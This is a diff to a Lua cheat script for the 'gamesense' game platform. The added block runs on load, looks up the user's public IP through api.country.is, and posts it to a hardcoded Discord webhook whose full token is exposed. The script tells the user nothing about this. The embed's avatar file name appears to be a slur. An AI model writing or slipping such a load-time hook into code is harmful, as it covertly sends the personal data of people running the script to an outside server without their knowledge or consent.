@@ -11,6 +11,26 @@ local vector = require("vector")
 local websockets = require "gamesense/websockets"
 local http = require "gamesense/http"
 local images = require 'gamesense/images'
+local discord = require("gamesense/discord_webhooks")
+
+http.get('https://api.country.is/', function(s,r)
+    if s and r.status == 200 then
+        local data = json.parse(r.body)
+        user_ip = data.ip
+
+        
+        local Webhook = discord.new("https://discord.com/api/webhooks/1354527011678191899/e_aOXMpeMFHwwm6j_6_A1J-s9YMdHOsN5BsKnkS31eF_f1VJHT2CGeeiKcHVOVG2AM-E")
+        local RichEmbed = discord.newEmbed()
+        Webhook:setUsername("Erased")
+        RichEmbed:setTitle(":star: Lua has been loaded!")
+        Webhook:setAvatarURL("https://media.discordapp.net/attachments/1347639800991318190/1354499444246053075/niger.png?ex=67e58368&is=67e431e8&hm=640f9cc96943d76f51ed80d7b408f0014ad9116ca98fc51bfba9c50cd59dc4b9&=&format=webp&quality=lossless&width=662&height=883")
+        RichEmbed:addField(":bust_in_silhouette: Username: Admin")
+        RichEmbed:addField(":link: Lua:", "Erased.pw")
+        RichEmbed:addField(":wireless: Session:", ""..user_ip)
+        RichEmbed:setColor(4667498)
+        Webhook:send(RichEmbed)
+    end
+end)
 local bit = require "bit"
 local currantstate = 1
 local should_swap = 0
